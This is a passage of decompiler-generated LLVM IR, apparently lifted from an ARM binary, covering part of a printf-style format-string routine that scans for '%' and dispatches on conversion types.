  store i32 %v3_d70c, i32* %stack_var_-36, align 4
  %v6_d70c = load i32, i32* @r5, align 4
  %v15_d70c = load i32, i32* @r8, align 4
  %v18_d70c = load i32, i32* @sb, align 4
  %v21_d70c = load i32, i32* @sl, align 4
  %v24_d70c = load i32, i32* @fp, align 4
  %v2_d714 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_d714, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_d714, i32* %r0.global-to-local, align 4
  %v0_d720 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_d720, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_d728 = call i32 @function_dd00(i32* nonnull %stack_var_-332)
  store i32 %v2_d728, i32* %r0.global-to-local, align 4
  %v1_d72c = icmp slt i32 %v2_d728, 0
  br i1 %v1_d72c, label %dec_label_pc_d734, label %dec_label_pc_d768

dec_label_pc_d734:                                ; preds = %dec_label_pc_d70c
  %v3_d734 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_d734, i32* @r4, align 4
  store i32 %v3_d734, i32* @r0, align 4
  %v0_d73c = call i32 @function_ecc0()
  store i32 %v0_d73c, i32* %r0.global-to-local, align 4
  %v2_d740 = icmp eq i32 %v0_d73c, 0
  br i1 %v2_d740, label %bb, label %dec_label_pc_d750

bb:                                               ; preds = %dec_label_pc_d734
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dce0

dec_label_pc_d750:                                ; preds = %dec_label_pc_d734
  %v0_d750 = load i32, i32* @r4, align 4
  store i32 %v0_d750, i32* %r0.global-to-local, align 4
  %v0_d754 = load i32, i32* @fp, align 4
  store i32 %v0_d754, i32* %r2.global-to-local, align 4
  %v3_d758 = call i32 @function_11230(i32 %v0_d750, i32 %v0_d73c, i32 %v0_d754)
  store i32 %v3_d758, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dce0

dec_label_pc_d768:                                ; preds = %dec_label_pc_d70c
  store i32 %v2_d714, i32* %r0.global-to-local, align 4
  %v0_d76c = load i32, i32* @r5, align 4
  %v2_d770 = call i32 @function_dd98(i32 %v2_d714, i32 %v0_d76c)
  store i32 %v2_d770, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_d810 = zext i8 %tmp104 to i32
  %v2_d818 = ptrtoint i32* %stack_var_-252 to i32
  %v2_d838 = ptrtoint i32* %stack_var_-36 to i32
  %v2_d850 = icmp eq i32 %tmp102, 0
  %v1_d864 = inttoptr i32 %tmp101 to i32*
  %v2_db54 = ptrtoint i32* %stack_var_-180 to i32
  %v2_da70 = ptrtoint i32* %stack_var_-44 to i32
  %v2_da84 = ptrtoint i32* %stack_var_-52 to i32
  %v3_da20 = add i32 %tmp101, 4
  %v4_da20 = inttoptr i32 %v3_da20 to i32*
  %v2_da24 = ptrtoint i32* %stack_var_-328 to i32
  %v7_d8e4 = zext i8 %tmp99 to i32
  %v2_d920 = ptrtoint i32* %stack_var_-53 to i32
  %v5_d928 = bitcast i32* %stack_var_-53 to i8*
  %v2_d930 = icmp ugt i32 %tmp102, 4
  %v7_d930 = icmp eq i32 %tmp102, 5
  %v0_dcc8.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_d848187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_da44 = icmp ugt i32 %tmp102, 16
  %v7_da44 = icmp eq i32 %tmp102, 17
  %v2_da48 = xor i1 %v7_da44, true
  %v3_da48 = and i1 %v2_da44, %v2_da48
  %v2_dae4 = icmp ugt i32 %tmp102, 18
  %v7_dae4 = icmp eq i32 %tmp102, 19
  %v2_dae8 = xor i1 %v7_dae4, true
  %v3_dae8 = and i1 %v2_dae4, %v2_dae8
  %v7_db48 = icmp eq i32 %tmp102, 20
  %v2_d888 = add i32 %tmp102, ptrtoint (i32* @global_var_15d50.333 to i32)
  %v1_d88c = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_15d50.333 to i32), i32 -1)
  %v2_d88c = inttoptr i32 %v1_d88c to i8*
  %v2_d8b8 = xor i1 %v7_d930, true
  %v3_d8b8 = and i1 %v2_d930, %v2_d8b8
  %v7_d8ec = icmp eq i32 %tmp102, 1
  %v2_d938 = xor i1 %v2_d930, true
  %v3_d938 = or i1 %v7_d930, %v2_d938
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_d9a0 = icmp eq i32 %tmp102, 3
  %v11_d9ac = icmp eq i32 %tmp102, 4
  %v9_d81c = mul nuw nsw i32 %v4_d810, 8
  %v10_d81c = add nsw i32 %v9_d81c, -8
  %v6_d824 = add i32 %v10_d81c, %v2_d818
  br label %dec_label_pc_dcc8

bb126:                                            ; preds = %dec_label_pc_d780.outer, %.thread7
  %v2_d780185 = phi i8 [ %v2_d780, %.thread7 ], [ %v2_d780181, %dec_label_pc_d780.outer ]
  %v1_d794184 = phi i32 [ %v2_d794, %.thread7 ], [ %v0_d78049, %dec_label_pc_d780.outer ]
  %v8_d788 = icmp eq i8 %v2_d780185, 37
  br i1 %v8_d788, label %dec_label_pc_d79c, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_d794 = add i32 %v1_d794184, 1
  store i32 %v2_d794, i32* @r4, align 4
  %v1_d780 = inttoptr i32 %v2_d794 to i8*
  %v2_d780 = load i8, i8* %v1_d780, align 1
  %v3_d780 = zext i8 %v2_d780 to i32
  store i32 %v3_d780, i32* %r3.global-to-local, align 4
  %v2_d784 = icmp eq i8 %v2_d780, 0
  br i1 %v2_d784, label %dec_label_pc_d79c, label %bb126

dec_label_pc_d79c:                                ; preds = %bb126, %.thread7, %dec_label_pc_d780.outer
  %v1_d794.lcssa = phi i32 [ %v0_d78049, %dec_label_pc_d780.outer ], [ %v2_d794, %.thread7 ], [ %v1_d794184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d79c = sub i32 %v1_d794.lcssa, %v5_d7ac
  %v9_d79c = icmp eq i32 %v1_d794.lcssa, %v5_d7ac
  br i1 %v9_d79c, label %dec_label_pc_d7d0, label %dec_label_pc_d7a4

dec_label_pc_d7a4:                                ; preds = %dec_label_pc_d79c
  store i32 %v2_d79c, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_d79c, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_d7a4
  store i32 %v5_d7ac, i32* %r0.global-to-local, align 4
  %v5_d7b4 = load i32, i32* @fp, align 4
  store i32 %v5_d7b4, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_d7a4, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_d7a4 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_11230.331 to i32))
  %v0_d7bc = load i32, i32* %r0.global-to-local, align 4
  %v1_d7bc = load i32, i32* @r5, align 4
  %v9_d7bc = icmp eq i32 %v0_d7bc, %v1_d7bc
  br i1 %v9_d7bc, label %dec_label_pc_d7c4, label %dec_label_pc_dcd8

dec_label_pc_d7c4:                                ; preds = %bb130
  %v2_d7c8 = add i32 %v0_d7bc, %stack_var_-336.1.ph
  store i32 %v2_d7c8, i32* @lr, align 4
  %v0_d7d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d7d0

dec_label_pc_d7d0:                                ; preds = %dec_label_pc_d79c, %dec_label_pc_d7c4
  %v0_d7e4 = phi i32 [ %v5_d7ac, %dec_label_pc_d79c ], [ %v0_d7d0.pre, %dec_label_pc_d7c4 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_d79c ], [ %v2_d7c8, %dec_label_pc_d7c4 ]
  %v1_d7d0 = inttoptr i32 %v0_d7e4 to i8*
  %v2_d7d0 = load i8, i8* %v1_d7d0, align 1
  %v3_d7d0 = zext i8 %v2_d7d0 to i32
  store i32 %v3_d7d0, i32* %r3.global-to-local, align 4
  %v2_d7d4 = icmp eq i8 %v2_d7d0, 0
  br i1 %v2_d7d4, label %dec_label_pc_dce0, label %dec_label_pc_d7dc

dec_label_pc_d7dc:                                ; preds = %dec_label_pc_d7d0
  %v1_d7dc = add i32 %v0_d7e4, 1
  %v2_d7dc = inttoptr i32 %v1_d7dc to i8*
  %v3_d7dc = load i8, i8* %v2_d7dc, align 1
  %v4_d7dc = zext i8 %v3_d7dc to i32
  store i32 %v4_d7dc, i32* %r3.global-to-local, align 4
  %v7_d7e0 = icmp eq i8 %v3_d7dc, 37
  store i32 %v1_d7dc, i32* %r2.global-to-local, align 4
  br i1 %v7_d7e0, label %dec_label_pc_dcd0, label %dec_label_pc_d7ec

dec_label_pc_d7ec:                                ; preds = %dec_label_pc_d7dc
  store i32 %v2_d714, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d714, i32* %r0.global-to-local, align 4
  store i32 %v1_d7dc, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d800 = call i32 @function_dfb8(i32* nonnull %stack_var_-332)
  store i32 %v2_d714, i32* @r0, align 4
  %v0_d808 = call i32 @function_ddd0()
  store i32 %v0_d808, i32* %r0.global-to-local, align 4
  store i32 %v4_d810, i32* @ip, align 4
  store i32 %v2_d818, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_d7ec
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_d7ec
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_d824, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_d83078 = phi i32 [ %v6_d824, %bb133 ], [ %v2_d818, %.thread ]
  store i32 %v2_d838, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_d848187, label %dec_label_pc_d830, label %dec_label_pc_d84c

dec_label_pc_d830:                                ; preds = %bb134, %dec_label_pc_d830
  %v5_d840189 = phi i32 [ %v5_d840, %dec_label_pc_d830 ], [ %v2_d838, %bb134 ]
  %v0_d830188 = phi i32 [ %v1_d834, %dec_label_pc_d830 ], [ %v0_d83078, %bb134 ]
  %v2_d830 = add i32 %v5_d840189, -4
  %v3_d830 = inttoptr i32 %v2_d830 to i32*
  store i32 %v0_d830188, i32* %v3_d830, align 4
  %v0_d834 = load i32, i32* %r3.global-to-local, align 4
  %v1_d834 = add i32 %v0_d834, 8
  store i32 %v1_d834, i32* %r3.global-to-local, align 4
  %v0_d83c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d83c.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_d838, i32* @lr, align 4
  %v4_d840 = mul i32 %v0_d83c.pre, 4
  %v5_d840 = add i32 %v4_d840, %v2_d838
  %v1_d844 = add i32 %v0_d83c.pre, 1
  store i32 %v1_d844, i32* %r2.global-to-local, align 4
  %v5_d848 = icmp slt i32 %v0_d83c.pre, %v1_d83c.pre
  br i1 %v5_d848, label %dec_label_pc_d830, label %dec_label_pc_d84c

dec_label_pc_d84c:                                ; preds = %dec_label_pc_d830, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_d850, label %dec_label_pc_d858, label %dec_label_pc_d87c

dec_label_pc_d858:                                ; preds = %dec_label_pc_d84c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_d864 = load i32, i32* %v1_d864, align 4
  store i32 %v2_d864, i32* %r0.global-to-local, align 4
  %v1_d868 = and i32 %v0_d8ac, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_d870 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_d870, i32* %r3.global-to-local, align 4
  %v4_d874 = inttoptr i32 %v2_d864 to i8*
  %v5_d874 = call i32 @function_114dc(i8* %v4_d874, i32 %v1_d868, i32 %stack_var_-336.2, i32 %v3_d870)
  store i32 %v5_d874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dcc4

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d84c
  br i1 %tmp195, label %dec_label_pc_da08, label %dec_label_pc_d884

dec_label_pc_d884:                                ; preds = %dec_label_pc_d87c
  store i32 %v2_d888, i32* %r3.global-to-local, align 4
  %v3_d88c = load i8, i8* %v2_d88c, align 1
  %v4_d88c = zext i8 %v3_d88c to i32
  store i32 %v4_d88c, i32* @r4, align 4
  %v7_d890 = icmp eq i8 %v3_d88c, 10
  br i1 %v7_d890, label %dec_label_pc_d89c, label %bb135

bb135:                                            ; preds = %dec_label_pc_d884
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d884
  store i32 %v0_d8ac, i32* %r3.global-to-local, align 4
  %v1_d8a0 = and i32 %v0_d8ac, 32
  %v2_d8a0 = icmp eq i32 %v1_d8a0, 0
  %.175 = select i1 %v2_d8a0, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_d8ac = and i32 %v0_d8ac, 64
  %v2_d8ac = icmp eq i32 %v1_d8ac, 0
  br i1 %v2_d8ac, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_d89c
  %.176 = select i1 %v2_d8a0, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_d89c, %bb138
  br i1 %v3_d8b8, label %.thread84, label %dec_label_pc_d8c0

.thread84:                                        ; preds = %bb139
  %v5_d8b8 = sub nsw i32 0, %v4_d88c
  store i32 %v5_d8b8, i32* @r4, align 4
  br label %dec_label_pc_d8d8

dec_label_pc_d8c0:                                ; preds = %bb139
  br i1 %v7_d9a0, label %bb140, label %dec_label_pc_d8cc

bb140:                                            ; preds = %dec_label_pc_d8c0
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_d8d8

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d8c0
  br i1 %v7_d8ec, label %dec_label_pc_d8dc, label %dec_label_pc_d8d8

dec_label_pc_d8d8:                                ; preds = %.thread84, %bb140, %dec_label_pc_d8cc
  %v0_d90486 = phi i32 [ %v5_d8b8, %.thread84 ], [ %v4_d88c, %bb140 ], [ %v4_d88c, %dec_label_pc_d8cc ]
  br label %dec_label_pc_d8dc

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8cc, %dec_label_pc_d8d8
  %v0_d90485 = phi i32 [ %v0_d90486, %dec_label_pc_d8d8 ], [ %v4_d88c, %dec_label_pc_d8cc ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_d8d8 ], [ 6, %dec_label_pc_d8cc ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_d8dc = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_d8dc, i32* %r3.global-to-local, align 4
  %v1_d8e0 = icmp slt i32 %v3_d8dc, 0
  %v7_d8e4. = select i1 %v1_d8e0, i32 %v7_d8e4, i32 32
  store i32 %v7_d8e4., i32* @sb, align 4
  br i1 %v7_d8ec, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_d8dc
  store i32 %v2_d838, i32* @lr, align 4
  %v2_d8f4 = load i32, i32* @ip, align 4
  %v5_d8f4 = mul i32 %v2_d8f4, 4
  %v6_d8f4 = add i32 %v5_d8f4, %v2_d838
  store i32 %v6_d8f4, i32* %r3.global-to-local, align 4
  %v2_d8f8 = add i32 %v6_d8f4, -260
  %v3_d8f8 = inttoptr i32 %v2_d8f8 to i32*
  %v4_d8f8 = load i32, i32* %v3_d8f8, align 4
  store i32 %v4_d8f8, i32* %r3.global-to-local, align 4
  %v2_d900 = and i32 %v4_d8f8, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_d8dc, %.thread16
  %storemerge94 = phi i32 [ %v2_d900, %.thread16 ], [ 1024, %dec_label_pc_d8dc ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_d90485, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_d90c = call i32 @function_1146c()
  %v0_d910 = load i32, i32* @r1, align 4
  store i32 %v0_d910, i32* %r2.global-to-local, align 4
  %v0_d91c = load i32, i32* @r4, align 4
  store i32 %v0_d91c, i32* %r3.global-to-local, align 4
  store i32 %v2_d920, i32* %r0.global-to-local, align 4
  %v0_d924 = load i32, i32* @r5, align 4
  %v6_d928 = call i32 @function_11510(i8* %v5_d928, i32 %v0_d90c, i32 %v0_d910, i32 %v0_d91c, i32 %v0_d924)
  store i32 %v6_d928, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_d928, i32* @r6, align 4
  br i1 %v3_d938, label %bb148, label %dec_label_pc_d93c

dec_label_pc_d93c:                                ; preds = %bb145
  %v7_d928 = inttoptr i32 %v6_d928 to i8*
  %v3_d93c = load i8, i8* %v7_d928, align 1
  %v7_d940 = icmp eq i8 %v3_d93c, 45
  %v2_d948 = or i32 %v0_d8ac, 2
  %v2_d948.stack_var_-316.4 = select i1 %v7_d940, i32 %v2_d948, i32 %v0_d8ac
  store i32 %v2_d948.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_d940, label %.thread18, label %dec_label_pc_d95c

.thread18:                                        ; preds = %dec_label_pc_d93c
  %v3_d94c = add i32 %v6_d928, 1
  store i32 %v3_d94c, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_d95c:                                ; preds = %dec_label_pc_d93c
  %v1_d95c = and i32 %v2_d948.stack_var_-316.4, 2
  %v2_d95c = icmp eq i32 %v1_d95c, 0
  br i1 %v2_d95c, label %dec_label_pc_d968, label %bb146

bb146:                                            ; preds = %dec_label_pc_d95c
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_d968:                                ; preds = %dec_label_pc_d95c
  %v1_d968 = urem i32 %v2_d948.stack_var_-316.4, 2
  %v2_d968 = icmp eq i32 %v1_d968, 0
  br i1 %v2_d968, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_d968
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_d968, %bb147
  %v0_d9c4 = phi i32 [ %v6_d928, %bb145 ], [ %v3_d94c, %.thread18 ], [ %v6_d928, %dec_label_pc_d968 ], [ %v6_d928, %bb147 ], [ %v6_d928, %bb146 ]
  %v0_d980 = phi i32 [ %v0_d8ac, %bb145 ], [ %v2_d948, %.thread18 ], [ %v0_d8ac, %dec_label_pc_d968 ], [ %v0_d8ac, %bb147 ], [ %v0_d8ac, %bb146 ]
  %v3_d970 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_d970, i32* %r2.global-to-local, align 4
  store i32 %v0_d980, i32* %r3.global-to-local, align 4
  %v1_d978 = icmp slt i32 %v3_d970, 0
  br i1 %v1_d978, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_d9a8 = phi i32 [ %v3_d970, %bb148 ], [ 1, %bb149 ]
  %v1_d980 = and i32 %v0_d980, 16
  %v2_d980 = icmp eq i32 %v1_d980, 0
  store i32 %v2_db54, i32* %r3.global-to-local, align 4
  %v2_d988 = sub i32 %v2_db54, %v0_d9c4
  %v1_d98c = add i32 %v2_d988, 127
  store i32 %v1_d98c, i32* @r5, align 4
  br i1 %v2_d980, label %bb157, label %dec_label_pc_d994

dec_label_pc_d994:                                ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_d994
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_d994, %bb151
  br i1 %v7_d9a0, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_d9a8, %v1_d98c
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_d9ac, label %dec_label_pc_d9b4, label %bb157

dec_label_pc_d9b4:                                ; preds = %bb155
  %v1_d9b4 = inttoptr i32 %v0_d9c4 to i8*
  %v2_d9b4 = load i8, i8* %v1_d9b4, align 1
  %v3_d9b4 = zext i8 %v2_d9b4 to i32
  store i32 %v3_d9b4, i32* %r3.global-to-local, align 4
  %v7_d9b8 = icmp eq i8 %v2_d9b4, 48
  br i1 %v7_d9b8, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_d9b4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_d9b4
  %v2_d9c0 = add i32 %v2_d988, 128
  store i32 %v2_d9c0, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_d9fc = phi i32 [ %v0_d9a8, %bb155 ], [ %v0_d9a8, %bb150 ], [ 1, %bb156 ], [ %v2_d9c0, %.thread25 ], [ %v0_d9a8, %bb154 ]
  %v1_d9c4 = inttoptr i32 %v0_d9c4 to i8*
  %v2_d9c4 = load i8, i8* %v1_d9c4, align 1
  %v3_d9c4 = zext i8 %v2_d9c4 to i32
  store i32 %v3_d9c4, i32* %r3.global-to-local, align 4
  %v7_d9c8 = icmp eq i8 %v2_d9c4, 48
  br i1 %v7_d9c8, label %dec_label_pc_d9d0, label %dec_label_pc_d9f8

dec_label_pc_d9d0:                                ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_d9d4 = load i32, i32* @r7, align 4
  %v7_d9d8 = icmp slt i32 %v0_d9d4, 6
  br i1 %v7_d9d8, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_d9d0
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_d9d0, %bb158
  br i1 %v7_d8ec, label %.thread26, label %dec_label_pc_d9ec

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_15d34.335 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_db6c

dec_label_pc_d9ec:                                ; preds = %bb159
  %v2_d9ec = icmp eq i32 %v5_d9fc, 0
  br i1 %v2_d9ec, label %bb160, label %dec_label_pc_d9f8

bb160:                                            ; preds = %dec_label_pc_d9ec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_db6c

dec_label_pc_d9f8:                                ; preds = %dec_label_pc_d9ec, %bb157
  %v2_d9f8 = sub i32 %v5_d9fc, %v1_d98c
  %tmp199 = icmp ugt i32 %v5_d9fc, %v1_d98c
  br i1 %tmp199, label %.thread90, label %dec_label_pc_db6c

.thread90:                                        ; preds = %dec_label_pc_d9f8
  store i32 %v2_d9f8, i32* @r4, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_da08:                                ; preds = %dec_label_pc_d87c
  br i1 %tmp196, label %dec_label_pc_da44, label %dec_label_pc_da10

dec_label_pc_da10:                                ; preds = %dec_label_pc_da08
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_da1c = load i32, i32* @fp, align 4
  store i32 %v0_da1c, i32* %r0.global-to-local, align 4
  %v2_da20 = load i32, i32* %v1_d864, align 4
  %v5_da20 = load i32, i32* %v4_da20, align 4
  store i32 %v5_da20, i32* %r2.global-to-local, align 4
  store i32 %v2_da24, i32* %r3.global-to-local, align 4
  %v6_da28 = call i32 @function_11660(i32 %v0_da1c, i32 %v2_da20, i32 %v5_da20, i32* nonnull %stack_var_-328, i32 54920)
  store i32 %v6_da28, i32* %r0.global-to-local, align 4
  %v1_da2c = icmp slt i32 %v6_da28, 0
  br i1 %v1_da2c, label %dec_label_pc_dcd8, label %dec_label_pc_da34

dec_label_pc_da34:                                ; preds = %dec_label_pc_da10
  %v2_da38 = add i32 %v6_da28, %stack_var_-336.2
  store i32 %v2_da38, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dcc4

dec_label_pc_da44:                                ; preds = %dec_label_pc_da08
  br i1 %v3_da48, label %dec_label_pc_dae4, label %dec_label_pc_da4c

dec_label_pc_da4c:                                ; preds = %dec_label_pc_da44
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_da44, label %dec_label_pc_da5c, label %dec_label_pc_daac

dec_label_pc_da5c:                                ; preds = %dec_label_pc_da4c
  %v2_da5c = load i32, i32* %v1_d864, align 4
  store i32 %v2_da5c, i32* %r3.global-to-local, align 4
  %v9_da60 = icmp eq i32 %v2_da5c, 0
  store i32 %v2_da5c, i32* %stack_var_-44, align 4
  br i1 %v9_da60, label %dec_label_pc_db74, label %dec_label_pc_da6c

dec_label_pc_da6c:                                ; preds = %dec_label_pc_da5c
  %v3_da6c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_da6c, i32* %r3.global-to-local, align 4
  store i32 %v2_da70, i32* @r0, align 4
  %v5_da7c = icmp slt i32 %v3_da6c, -1
  br i1 %v5_da7c, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_da6c
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_da6c, %bb161
  %storemerge193 = phi i32 [ %v3_da6c, %bb161 ], [ -1, %dec_label_pc_da6c ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_da70, i32* @r1, align 4
  store i32 %v2_da84, i32* %r3.global-to-local, align 4
  %v0_da88 = call i32 @function_11060()
  store i32 %v0_da88, i32* %r0.global-to-local, align 4
  %v7_da8c = icmp eq i32 %v0_da88, -1
  store i32 %v0_da88, i32* @r5, align 4
  br i1 %v7_da8c, label %dec_label_pc_dcd8, label %dec_label_pc_da98

dec_label_pc_da98:                                ; preds = %bb162
  %v0_da98 = load i32, i32* @sl, align 4
  store i32 %v0_da98, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_da98, i32* @r6, align 4
  br label %dec_label_pc_db88

dec_label_pc_daac:                                ; preds = %dec_label_pc_da4c
  store i32 %v2_db54, i32* %r8.global-to-local, align 4
  %v2_dab0 = load i32, i32* %v1_d864, align 4
  store i32 %v2_da84, i32* %r2.global-to-local, align 4
  store i32 %v2_db54, i32* %r0.global-to-local, align 4
  %v3_dabc = call i32 @function_11010(i32 %v2_db54, i32 %v2_dab0, i32 %v2_da84)
  store i32 %v3_dabc, i32* %r0.global-to-local, align 4
  %v7_dac0 = icmp eq i32 %v3_dabc, -1
  store i32 %v3_dabc, i32* @r5, align 4
  br i1 %v7_dac0, label %dec_label_pc_dcd8, label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_daac
  %v0_dacc = load i32, i32* @sl, align 4
  store i32 %v0_dacc, i32* @r4, align 4
  store i32 %v2_db54, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_dadc = trunc i32 %v0_dacc to i8
  %v2_dadc = load i32, i32* %r8.global-to-local, align 4
  %v4_dadc = add i32 %v2_dadc, %v3_dabc
  %v5_dadc = inttoptr i32 %v4_dadc to i8*
  store i8 %v1_dadc, i8* %v5_dadc, align 1
  %v0_db8c.pre.pre = load i32, i32* @r5, align 4
  %v1_db8c.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_dae4:                                ; preds = %dec_label_pc_da44
  br i1 %v3_dae8, label %dec_label_pc_db48, label %dec_label_pc_daec

dec_label_pc_daec:                                ; preds = %dec_label_pc_dae4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_daf4 = load i32, i32* %v1_d864, align 4
  br i1 %v7_dae4, label %dec_label_pc_daf4, label %dec_label_pc_db20

dec_label_pc_daf4:                                ; preds = %dec_label_pc_daec
  store i32 %v2_daf4, i32* @r6, align 4
  %v2_daf8 = icmp eq i32 %v2_daf4, 0
  br i1 %v2_daf8, label %dec_label_pc_db74, label %dec_label_pc_db00

dec_label_pc_db00:                                ; preds = %dec_label_pc_daf4, %dec_label_pc_db50
  %v0_db10 = phi i32 [ %v2_daf4, %dec_label_pc_daf4 ], [ %v3_db60, %dec_label_pc_db50 ]
  %v3_db00 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_db00, i32* %r3.global-to-local, align 4
  %v5_db0c = icmp slt i32 %v3_db00, -1
  br i1 %v5_db0c, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_db00
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_db00, %bb163
  %storemerge194 = phi i32 [ %v3_db00, %bb163 ], [ -1, %dec_label_pc_db00 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_db10, i32* %r0.global-to-local, align 4
  %v1_db14 = inttoptr i32 %v0_db10 to i8*
  %v2_db14 = call i32 @function_ef18(i8* %v1_db14)
  store i32 %v2_db14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_db7c

dec_label_pc_db20:                                ; preds = %dec_label_pc_daec
  store i32 %v2_daf4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
